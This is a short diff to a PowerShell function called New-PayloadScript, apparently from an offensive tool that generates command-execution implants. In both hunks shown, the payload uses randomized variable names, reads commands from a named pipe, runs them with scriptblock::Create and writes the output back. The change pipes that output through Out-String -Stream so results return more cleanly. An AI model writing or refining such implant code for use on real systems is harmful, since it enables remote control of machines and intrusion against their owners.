@@ -227,7 +227,7 @@ function New-PayloadScript {
             "if(`$$vCmd -eq 'exit'){break};" +
             "$moduleHandler;" +
             "`$$vCl=[System.Collections.Generic.List[string]]::new();" +
-            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
+            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String -Stream|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
             "`$$vCl|%{`$$vWr.WriteLine(`$_.TrimEnd())};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Close();`$$vPipe.Dispose()"
@@ -256,7 +256,7 @@ function New-PayloadScript {
             "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
             "`$$vCl=[System.Collections.Generic.List[string]]::new();" +
-            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
+            "try{. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String -Stream|%{`$$vCl.Add(`"`$_`")}}catch{`$$vCl.Add(`"`$(`$_.Exception.Message)`")};" +
             "`$$vCl|%{`$$vWr.WriteLine(`$_.TrimEnd())};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Dispose()"
